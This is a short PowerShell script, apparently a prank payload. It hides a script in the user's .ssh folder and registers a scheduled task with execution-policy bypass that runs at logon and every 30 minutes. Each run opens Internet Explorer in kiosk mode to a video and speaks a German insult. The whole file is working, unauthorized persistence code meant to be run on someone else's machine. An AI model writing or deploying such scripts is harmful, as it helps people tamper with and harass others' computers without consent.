$dir = "C:\\Users\\$env:USERNAME\\.ssh\script.ps1"

unregister-scheduledtask -TaskName "Task2" -confirm:$false -ErrorAction SilentlyContinue

Set-Content -Path $dir -Value "Start-Process iexplore -ArgumentList '-k https://player.vimeo.com/video/198392879?autoplay=1 -WindowStyle Maximized'; Add-Type -AssemblyName System.speech; `$TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; `$TTS.Speak('Du bist eine Lusche. Viel spass beim video.'); Exit"

$Sta = New-ScheduledTaskAction 'PowerShell.exe' ('-noprofile -executionpolicy bypass -file ' + $dir)
$Stt = New-ScheduledTaskTrigger -AtLogOn -User ($env:USERNAME)
$Stt.Repetition = (New-ScheduledTaskTrigger -once -at "8am" -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Hours 5)).repetition
Register-ScheduledTask -TaskName "Task2" -Trigger $Stt -Action $Sta
